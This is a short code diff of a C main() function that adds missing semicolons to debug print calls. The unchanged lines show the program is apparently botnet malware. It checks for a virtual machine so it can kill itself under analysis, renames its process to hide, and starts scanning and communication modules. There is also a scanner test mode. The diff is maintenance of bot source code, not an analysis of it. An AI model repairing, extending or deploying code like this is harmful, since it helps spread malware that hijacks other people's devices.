@@ -2,19 +2,19 @@
 
 int main(void)
 {
-    printd("Debug on!")
+    printd("Debug on!");
 
     // Initilize many things
     rand_init();
-    printd("rand_init ok")
+    printd("rand_init ok");
     obfsc_init(); // Must be called first so we kill ourselves if it's a VM
-    printd("obfsc_init ok")
+    printd("obfsc_init ok");
     proc_init();
-    printd("proc_init ok")
+    printd("proc_init ok");
     scan_init();
-    printd("scan_init ok")
+    printd("scan_init ok");
     comm_init();
-    printd("comm_init ok")
+    printd("comm_init ok");
 
 #   ifndef DEBUG
     prctl(PR_SET_NAME, MAIN_NAME, 0, 0, 0); // Change the process name
@@ -53,9 +53,9 @@ int main(void)
     char *info = MAIN_BOTINFO;
 #   endif /* DEBUG */
 
-    printd("Starting!")
+    printd("Starting!");
 #   ifdef SCANNER_TEST
-    printd("Scanner test mode detected!")
+    printd("Scanner test mode detected!");
     scan_scanner();
     exit(1);
 #   endif
